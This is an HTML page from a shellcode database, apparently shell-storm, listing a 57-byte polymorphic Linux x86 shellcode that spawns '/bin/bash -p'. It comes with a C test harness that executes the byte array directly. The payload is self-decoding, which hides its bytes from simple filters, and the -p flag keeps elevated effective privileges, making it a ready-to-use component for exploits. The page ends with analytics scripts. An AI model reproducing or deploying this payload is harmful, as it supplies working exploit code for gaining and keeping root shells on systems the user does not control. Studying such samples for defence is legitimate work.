<html><head><title>Linux/x86 - polymorphic execve(/bin/bash, [/bin/bash, -p], NULL)  - 57 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*

Title: 	Linux x86 - polymorphic execve(&quot;/bin/bash&quot;, [&quot;/bin/bash&quot;, &quot;-p&quot;], NULL) - 57 bytes
Author:	Jonathan Salwan
Mail:	submit@shell-storm.org
Web:	http://www.shell-storm.org

!Database of Shellcodes http://www.shell-storm.org/shellcode/


sh sets (euid, egid) to (uid, gid) if -p not supplied and uid &lt; 100
Read more: http://www.faqs.org/faqs/unix-faq/shell/bash/#ixzz0mzPmJC49

Based on http://www.shell-storm.org/shellcode/files/shellcode-606.php
*/

#include &lt;stdio.h&gt;

char shellcode[] = &quot;\xeb\x11\x5e\x31\xc9\xb1\x21\x80&quot;
		   &quot;\x6c\x0e\xff\x01\x80\xe9\x01\x75&quot;
  		   &quot;\xf6\xeb\x05\xe8\xea\xff\xff\xff&quot;
		   &quot;\x6b\x0c\x59\x9a\x53\x67\x69\x2e&quot;
		   &quot;\x71\x8a\xe2\x53\x6b\x69\x69\x30&quot;
		   &quot;\x63\x62\x74\x69\x30\x63\x6a\x6f&quot;
		   &quot;\x8a\xe4\x53\x52\x54\x8a\xe2\xce&quot;
		   &quot;\x81&quot;;

int main(int argc, char *argv[])
{
       	fprintf(stdout,&quot;Length: %d\n&quot;,strlen(shellcode));
	(*(void(*)()) shellcode)();       
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
